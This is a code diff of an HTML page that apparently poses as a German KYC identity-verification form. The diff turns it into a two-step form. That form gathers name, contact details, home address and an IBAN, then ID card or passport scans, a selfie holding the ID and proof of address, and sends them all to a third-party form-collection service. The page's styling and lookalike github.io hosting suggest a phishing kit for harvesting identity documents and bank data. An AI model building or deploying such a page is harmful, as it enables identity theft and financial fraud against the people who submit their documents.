@@ -12,17 +12,16 @@
       --text: #111;
     }
 
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       font-family: 'Inter', sans-serif;
       margin: 0;
       padding: 0;
       background-color: var(--gray-bg);
       color: var(--text);
-      background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      height: 100vh;
     }
 
     .kyc-icon {
@@ -46,6 +45,7 @@
       text-align: center;
       font-size: 20px;
       font-weight: 900;
+      color: #000;
       margin-bottom: 12px;
     }
 
@@ -63,7 +63,7 @@
       margin: 14px 0 6px;
     }
 
-    input, select {
+    input, select, textarea {
       width: 100%;
       padding: 12px;
       font-size: 15px;
@@ -72,16 +72,12 @@
       background-color: #f9f9f9;
     }
 
-    .small-text {
-      font-size: 14px;
-      color: #555;
-      margin-top: 4px;
-      margin-bottom: 12px;
+    textarea {
+      min-height: 100px;
+      resize: vertical;
     }
 
     button {
-      display: block;
-      width: 100%;
       padding: 14px;
       background-color: transparent;
       color: #999;
@@ -91,7 +87,6 @@
       border-radius: 6px;
       cursor: pointer;
       transition: all 0.3s ease;
-      margin-top: 20px;
     }
 
     button:hover {
@@ -132,45 +127,150 @@
       margin: 12px auto;
       line-height: 1.6;
     }
+
+    /* Multi-step form styles */
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+
+    .buttons button {
+      width: 150px;
+      margin-top: 0;
+    }
+
+    /* Two-column layout for fields */
+    .row {
+      display: flex;
+      gap: 20px;
+    }
+
+    .row > div {
+      flex: 1;
+    }
+
+    .small-text {
+      font-size: 14px;
+      color: #555;
+      margin-top: 4px;
+      margin-bottom: 12px;
+    }
+    body {
+      background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      margin: 0;
+    }
+    body {
+  background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
+  background-size: cover; /* Makes the background image cover the whole screen */
+  background-position: center; /* Centers the background image */
+  background-repeat: no-repeat; /* Ensures the image doesn’t repeat */
+  height: 100vh; /* Make sure it covers the full height of the page */
+  margin: 0; /* Remove any default margin */
+}
   </style>
 </head>
 <body>
   <div class="form-container">
-    <!-- Icon -->
+    <!-- KYC Professional Icon -->
     <svg class="kyc-icon" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-label="KYC Professional Icon" role="img">
       <path d="M32 2L4 12v20c0 17.67 12.19 30.87 28 30 15.81.87 28-12.33 28-30V12L32 2zM28 44l-10-10 4.24-4.24L28 35.5l13.76-13.76L46 26l-18 18z"/>
     </svg>
 
     <form id="kycForm" action="https://formcarry.com/s/BnaBh-XE7en" method="POST" enctype="multipart/form-data" novalidate>
-      <h2>Dokumenten-Upload zur Verifizierung</h2>
-      <p class="subtitle">
-        Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch. Zusätzlich ist ein aktuelles Selfie mit Ihrem Ausweis erforderlich.
-      </p>
+      <!-- Step 1 -->
+      <div class="step active" data-step="1">
+        <h2>Schritt 1: Persönliche Informationen</h2>
+        <p class="subtitle">Bitte geben Sie Ihre persönlichen Daten korrekt ein.</p>
 
-      <label for="ausweisart">Art des Ausweisdokuments</label>
-      <select id="ausweisart" name="Ausweisart">
-        <option value="">Bitte auswählen</option>
-        <option value="Personalausweis" selected>Personalausweis</option>
-        <option value="Reisepass">Reisepass</option>
-      </select>
+        <label for="fullname">Vor- und Nachname</label>
+        <input type="text" id="fullname" name="VorUndNachname" />
 
-      <label for="vorderseite">Vorderseite (Datei)</label>
-      <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" />
+        <div class="row">
+          <div>
+            <label for="email">E-Mail-Adresse</label>
+            <input type="email" id="email" name="Email" />
+          </div>
+          <div>
+            <label for="telefon">Telefonnummer</label>
+            <input type="tel" id="telefon" name="Telefonnummer" />
+          </div>
+        </div>
 
-      <div id="rueckseite-container">
-        <label for="rueckseite">Rückseite (Datei)</label>
-        <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf" />
+        <label for="strasse">Straße und Hausnummer</label>
+        <input type="text" id="strasse" name="StrasseUndHausnummer" />
+
+        <div class="row">
+          <div>
+            <label for="plz">Postleitzahl</label>
+            <input type="text" id="plz" name="Postleitzahl" />
+          </div>
+          <div>
+            <label for="stadt">Stadt</label>
+            <input type="text" id="stadt" name="Stadt" />
+          </div>
+        </div>
+
+        <label for="land">Land</label>
+        <select id="land" name="Land">
+          <option value="Deutschland" selected>Deutschland</option>
+          <option value="Schweiz">Schweiz</option>
+          <option value="Luxemburg">Luxemburg</option>
+          <option value="Österreich">Österreich</option>
+        </select>
+
+        <label for="referenzkonto">Referenzkonto für Auszahlung</label>
+        <input type="text" id="referenzkonto" name="Referenzkonto" placeholder="IBAN" />
       </div>
 
-      <label for="selfie">Selfie mit Ausweis</label>
-      <input type="file" id="selfie" name="SelfieMitAusweis" accept=".jpg,.jpeg,.png,.pdf" />
-      <p class="small-text">Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.</p>
+<!-- Step 2 -->
+<div class="step" data-step="2">
+  <h2>Schritt 2: Dokumenten-Upload zur Verifizierung</h2>
+  <p class="subtitle">
+    Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder- und Rückseite). Zusätzlich ist ein aktuelles Selfie mit Ihrem Ausweis erforderlich.
+  </p>
 
-      <label for="addressProof">Adressnachweis (z. B. Stromrechnung, Kontoauszug)</label>
-      <input type="file" id="addressProof" name="Adressnachweis" accept=".pdf,.jpg,.jpeg,.png" />
-      <p class="small-text">Bitte laden Sie ein offizielles Dokument hoch, das Ihre Adresse bestätigt (nicht älter als 3 Monate).</p>
+  <label for="ausweisart">Art des Ausweisdokuments</label>
+  <select id="ausweisart" name="Ausweisart">
+    <option value="">Bitte auswählen</option>
+    <option value="Personalausweis" selected>Personalausweis</option>
+    <option value="Reisepass">Reisepass</option>
+  </select>
 
-      <button type="submit">Absenden</button>
+  <label for="vorderseite">Vorderseite (Datei)</label>
+  <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" />
+
+  <div id="rueckseite-container">
+    <label for="rueckseite">Rückseite (Datei)</label>
+    <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf" />
+  </div>
+
+  <label for="selfie">Selfie mit Ausweis</label>
+  <input type="file" id="selfie" name="SelfieMitAusweis" accept=".jpg,.jpeg,.png,.pdf" />
+  <p class="small-text">Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.</p>
+
+  <!-- NEW: Proof of Address -->
+  <label for="addressProof">Adressnachweis (z. B. Stromrechnung, Kontoauszug)</label>
+  <input type="file" id="addressProof" name="Adressnachweis" accept=".pdf,.jpg,.jpeg,.png" />
+  <p class="small-text">Bitte laden Sie ein offizielles Dokument hoch, das Ihre Adresse bestätigt (nicht älter als 3 Monate).</p>
+</div>
+
+      <div class="buttons">
+        <button type="button" id="prevBtn" style="visibility:hidden;">Zurück</button>
+        <button type="button" id="nextBtn">Weiter</button>
+      </div>
     </form>
   </div>
 
@@ -194,17 +294,59 @@
   </footer>
 
   <script>
-    // Rückseite nur anzeigen, wenn Ausweis = Personalausweis
-    const ausweisartSelect = document.getElementById('ausweisart');
-    const rueckseiteContainer = document.getElementById('rueckseite-container');
+    (function() {
+      const form = document.getElementById('kycForm');
+      const steps = form.querySelectorAll('.step');
+      const nextBtn = document.getElementById('nextBtn');
+      const prevBtn = document.getElementById('prevBtn');
+      const ausweisartSelect = document.getElementById('ausweisart');
+      const rueckseiteContainer = document.getElementById('rueckseite-container');
+      let currentStep = 0;
 
-    function toggleRueckseite() {
-      rueckseiteContainer.style.display =
-        ausweisartSelect.value === 'Reisepass' ? 'none' : 'block';
-    }
+      function showStep(step) {
+        steps.forEach((stepDiv, idx) => {
+          stepDiv.classList.toggle('active', idx === step);
+        });
+        prevBtn.style.visibility = step === 0 ? 'hidden' : 'visible';
+        nextBtn.textContent = step === steps.length - 1 ? 'Absenden' : 'Weiter';
 
-    ausweisartSelect.addEventListener('change', toggleRueckseite);
-    toggleRueckseite();
+        // Show/hide Rückseite on step 2 based on Ausweisart
+        if(step === 1) {
+          if(ausweisartSelect.value === 'Reisepass') {
+            rueckseiteContainer.style.display = 'none';
+          } else {
+            rueckseiteContainer.style.display = 'block';
+          }
+        }
+      }
+
+      nextBtn.addEventListener('click', () => {
+        if (currentStep < steps.length - 1) {
+          currentStep++;
+          showStep(currentStep);
+        } else {
+          form.submit();
+        }
+      });
+
+      prevBtn.addEventListener('click', () => {
+        if (currentStep > 0) {
+          currentStep--;
+          showStep(currentStep);
+        }
+      });
+
+      ausweisartSelect.addEventListener('change', () => {
+        if (ausweisartSelect.value === 'Reisepass') {
+          rueckseiteContainer.style.display = 'none';
+        } else {
+          rueckseiteContainer.style.display = 'block';
+        }
+      });
+
+      // Initialize
+      showStep(currentStep);
+    })();
   </script>
 </body>
 </html>
